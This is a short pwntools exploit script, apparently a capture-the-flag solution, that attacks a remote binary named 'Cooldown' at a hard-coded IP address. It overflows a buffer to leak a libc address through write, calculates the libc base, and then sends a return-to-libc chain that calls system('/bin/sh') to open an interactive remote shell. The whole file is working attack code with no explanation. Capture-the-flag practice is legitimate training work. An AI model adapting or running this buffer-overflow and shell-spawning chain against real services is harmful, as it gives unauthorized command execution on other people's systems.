from pwn import *

elf = ELF('./Cooldown')
# p = elf.process()
p = remote('141.164.48.191', 10005)
libc = ELF('./libc.so.6')

payload = b'a'*56
payload += p64(elf.sym['write'])

p.send(payload)

libc.address = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x3f20ca
print(hex(libc.address))

payload = b'a'*56
payload += p64(libc.address + 0x00000000000215bf)
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(libc.sym['system'])

p.sendline(payload)

p.interactive()